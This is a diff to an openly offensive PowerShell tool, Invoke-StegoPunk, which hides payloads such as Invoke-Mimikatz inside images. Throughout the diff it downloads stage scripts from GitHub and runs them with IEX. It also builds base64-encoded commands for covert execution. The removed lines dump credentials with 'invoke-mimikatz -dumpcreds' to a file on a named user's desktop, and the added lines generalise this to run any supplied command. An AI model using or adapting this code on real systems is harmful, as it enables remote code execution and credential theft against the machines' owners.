@@ -12,7 +12,8 @@ function Invoke-StegoPunk {
             [string]$ImageName,
             [string]$key,
             [ValidateSet("on","off")]
-            [string]$b_UAC
+            [string]$b_UAC,
+            [string]$command
             
           )  
 #invoke-stegopunk -mode encryption -fileurl 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1' -imageurl 'http://www.holidayguru.it/wp-content/uploads/2015/10/polignano_puglia.png' -imagename 'mix.png'                  
@@ -98,7 +99,7 @@ function Invoke-StegoPunk {
                 IEX $stage2.Downloadstring('https://raw.githubusercontent.com/Tru5tNo1/StegoPunk/master/Invoke-AES2Stage.ps1')
                 $base2 = Invoke-AES2Stage -key $key -imageurl $imageurl
                 iex ($base2)
-                $cmd = '$stage2 = New-Object System.Net.WebCLient;$proxy = New-Object System.Net.webproxy; $stage2.proxy = $proxy; $stage2.usedefaultcredentials = "true"; IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/StegoPunk/master/Invoke-AES1Stage.ps1");$base1 = Invoke-AES1Stage -key ' + $key + ' -imageurl ' + $imageurl + '; iex ($base1); invoke-mimikatz -dumpcreds > c:\users\v.delaurentis\desktop\vito.txt'
+                $cmd = '$stage2 = New-Object System.Net.WebCLient;$proxy = New-Object System.Net.webproxy; $stage2.proxy = $proxy; $stage2.usedefaultcredentials = "true"; IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/StegoPunk/master/Invoke-AES1Stage.ps1");$base1 = Invoke-AES1Stage -key ' + $key + ' -imageurl ' + $imageurl + '; iex ($base1);' + $command
                 $ubytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
                 $encodedcmd = [Convert]::ToBase64String($ubytes) 
                 write-Host `n$encodedcmd
@@ -114,7 +115,7 @@ function Invoke-StegoPunk {
                 IEx $stage2.Downloadstring("https://raw.githubusercontent.com/Tru5tNo1/StegoPunk/master/Invoke-AES1Stage.ps1")
                 $base1 = Invoke-AES1Stage -key $key -imageurl $imageurl
                 iex ($base1)
-                invoke-mimikatz -dumpcreds > c:\users\vito.txt
+                $command
                 }
           }
          
